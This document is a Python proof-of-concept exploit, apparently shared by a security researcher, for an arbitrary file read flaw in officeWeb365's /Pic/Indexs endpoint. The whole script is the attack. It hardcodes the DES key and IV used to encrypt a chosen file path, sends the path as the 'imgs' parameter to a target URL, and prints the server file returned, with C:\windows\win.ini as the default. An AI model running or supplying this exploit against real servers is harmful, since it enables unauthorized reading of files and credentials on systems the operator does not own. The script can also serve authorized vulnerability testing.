###officeWeb365 Indexs接口存在任意文件读取漏洞
###writer： summerainX
###脚本使用方式 python office_web365_index_fileread.py -u  url  -f file    (file不是必填项)
 
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad, unpad
import base64
import requests
import argparse
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 密钥和初始向量
Keys = bytes([102, 16, 93, 156, 78, 4, 218, 32])
Iv = bytes([55, 103, 246, 79, 36, 99, 167, 3])

#des加密
def encrypt_des(plaintext, key, iv):
    cipher = DES.new(key, DES.MODE_CBC, iv)
    padded_plaintext = pad(plaintext.encode('utf-8'), DES.block_size)
    ciphertext = cipher.encrypt(padded_plaintext)
    return base64.b64encode(ciphertext).decode('utf-8')


def get_content(url,file):
    try:
        ciphertext = encrypt_des(file, Keys, Iv)
        resp = requests.get(url+"/Pic/Indexs?imgs={}".format(ciphertext+"09"))
        if resp.status_code ==200:
            print("访问的文件路径为："+ file)
            if  re.search('<title>error</title>',resp.text):
                print("文件不存在！")                
            else:
                print("文件内容是：" )
                print(resp.text)
        else:
            print("漏洞不存在！")
    except:
        print("漏洞不存在！")
 
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-u', help='请输入url地址', required=True)  
    parser.add_argument('--file', '-f', help='请输入文件路径 默认为C:\\windows\\win.ini') 
    args = parser.parse_args()
    file = args.file if args.file else "C:\\windows\\win.ini"
    get_content(args.url.rstrip('/'),file)